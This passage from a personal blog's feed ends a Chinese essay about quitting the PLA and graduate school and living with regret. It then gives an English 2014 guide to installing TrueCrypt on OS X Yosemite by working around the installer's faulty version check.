是没什么前途的，至少对于我来说。但是我还是比较清醒，我自己还是一直的否定自己，不能偏听，因为你了解到的可能是别人故意想告诉你的。在不断的否定与被否定中感觉自己都要快精神分裂了，那段日子太难熬了。这样的日子从保研开始一直持续到毕业，因为在学校各种形式化而无实际内容的事情太多了，自己愈发的反感，领导还经常说形式就是内容，只有呵呵了。那时感觉自己深陷围城，需要立即出去，不然后面的人生就毁了，现在想想那时的自己，发现其实就是个被各种论调左右的傻逼而已，毫无主见。</p><p>本来已打算读个研究生总比不读好，后面的事情遇到再说的心态。然而后面遇到了意外情况（略）。自己彻底下决心退 PLA 了。当然，退也是得脱了一层皮才让走人的。为此和家里闹了很多次，对于农村家庭，这个事情算得上是天大的事了。一条能遇见的稳定的人生路是父母特别希望的，而自己缺要放弃还倒贴，想想自己都脑残。看着父母无奈的眼泪，自己一人回帝都办理各种手续，还得找工作……</p><p>现在看着科大的同学混得风生水起，而自己每月的工资只能持平帝都的高消费水平，问问自己后悔不，傻子才说不后悔。但是又能怎么样，自己选择的路跪着也得走完。每次都不敢给家里打电话，因为怕父母伤心，自己现在也没脸见他们，而自己不打父母更伤心了，唉。每次电话都能听见母亲的眼泪，自己心里也不是滋味，本来应该他们轻松的时候却还得拖累他们。</p><p>跳出围城，却又发现自己进入了另一个围城……</p><p>生活本该不是这样，自己累点倒是没什么，只是苦了父母了。</p><p>当时不知哪来的勇气狠下心退 PLA、退学去工作，现在估计也没那个魄力了。</p><p>最怕的是年轻气盛换来的却是自己曾经最厌恶的平庸人生，而自己也成为自己曾厌恶的那种人……</p><p>饱食终日，无所用心，何时才能成为高度自驱的人呢？</p><blockquote><p>常言道：follow your heart, but where is my heart? where is my dream?</p></blockquote><h4 id="关于读研的一些思考"><a href="#关于读研的一些思考" class="headerlink" title="// 关于读研的一些思考"></a>// 关于读研的一些思考</h4><p>退学也是受到了网上一些读研无用论或多或少的影响，现在看来有些事情的确是没经历过就没谈资，谨慎听取别人的建议，网络键盘侠居多，慎思之。</p><p>每个人的选择一定是当时当地的最优选择，把你时光穿梭回去，你还是这样。之前网上最多的看到就是 <strong>只要能力强学历不重要</strong> 这句话，这句话本身没有错，但是它是有适用条件的，它只对站在金字塔尖上的千分之一的人管用，后面的千分之二都不得不受到世俗的各种条条框框的羁绊，更何况后面还剩下的千分之998。</p><p>想到高考过后当时的物理老师说过的一些话,只要你能拿出高考时候40%的努力，一半都不用，你在大学及以后的学习中将会游刃有余，因为高考过后大部分人都懈怠了，能拿出20%的人少之又少，所以只要稍微努力些，稍微主动些已经超过大部分人了。</p><blockquote><p>种下一棵树最好的时间是过去和现在,永远知道自己在做什么、自己需要什么就行了。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h3 id=&quot;本文的存在仅是对自己无能的愤怒而已。&quot;&gt;&lt;a href=&quot;#本文的存在仅是对自己无能的愤怒而已。&quot; class=&quot;headerlink&quot;
        
      
    
    </summary>
    
      <category term="Life" scheme="https://lazymind.me/categories/Life/"/>
    
    
  </entry>
  
  <entry>
    <title>Install TrueCrypt On Mac OS X Yosemite 10.10</title>
    <link href="https://lazymind.me/2014/10/install-truecrypt-on-mac-osx-yosemite-10-10/"/>
    <id>https://lazymind.me/2014/10/install-truecrypt-on-mac-osx-yosemite-10-10/</id>
    <published>2014-10-19T00:00:00.000Z</published>
    <updated>2019-07-18T09:51:12.608Z</updated>
    
    <content type="html"><![CDATA[<p>Yesterday, I upgraded my MacBook OS to Yosemite 10.10. But when I reinstall <a href="http://en.wikipedia.org/wiki/TrueCrypt" target="_blank" rel="noopener">Truecrypt</a>(For some reasons, recommend Truecrypt 7.1a version), something get error.</p><p><img src="/images/truecrypt-install-error.png" alt="TrueCrypt-Error"></p><p>Guess the OS X version numbers. Truecrypt thinks 10.10 is &lt; 10.4 (the minimum Truecrypt requires), and the installer will block it’s installation on Yosemite. So you’ll be able to install it again on 10.40…or maybe, possibly 10.11 or later.</p><p>In the end, I found two solutions:</p><h2 id="The-first"><a href="#The-first" class="headerlink" title="The first:"></a>The first:</h2><ul><li>Open the .dmg</li><li>You’ll find the .mpkg. Right*click and “Show Package Contents”</li><li>Open Contents Dir</li><li>Open Packages Dir</li><li>Install each of the 4 packages in this order: <code>OSXFUSECore.pkg</code>, <code>OSXFUSEMacFUSE.pkg</code>, <code>MacFUSE.pkg</code>, <code>TrueCrypt.pkg</code> (It is possible MacFUSE.pkg will install the two before it, but we ran each to play it safe.).</li></ul><p>That’s it; it’s Truecrypt has been working fine for us using this method.</p><h2 id="The-second"><a href="#The-second" class="headerlink" title="The second:"></a>The second:</h2><ul><li><p>Open the .dmg</p></li><li><p>You’ll find the <code>.mpkg</code>. Right click and “Show Package Contents”</p></li><li><p>Open Contents Dir</p></li><li><p>Edit Contents/distribution.dist using Text Editor</p></li><li><p>You’ll find the code as below</p><pre><code>function pm_install_check() {  if(!(system.version.ProductVersion &gt;= &apos;10.4.0&apos;)) {    my.result.title = &apos;Error&apos;;    my.result.message = &apos;TrueCrypt requires Mac OS X 10.4 or later.&apos;;    my.result.type = &apos;Fatal&apos;;    return false;  }  return true;}</code></pre></li><li><p>change it as follow:</p><pre><code>function pm_install_check() {  return true;}</code></pre></li></ul><p>Now, you can install  .mpkg  without error.</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;Yesterday, I upgraded my MacBook OS to Yosemite 10.10. But when I reinstall &lt;a href=&quot;http://en.wikipedia.org/wiki/TrueCrypt&quot;
        
      
    
    </summary>
    
      <category term="Mac" scheme="https://lazymind.me/categories/Mac/"/>
    
    
      <category term="mac" scheme="https://lazymind.me/tags/mac/"/>
    
  </entry>
  
</feed>
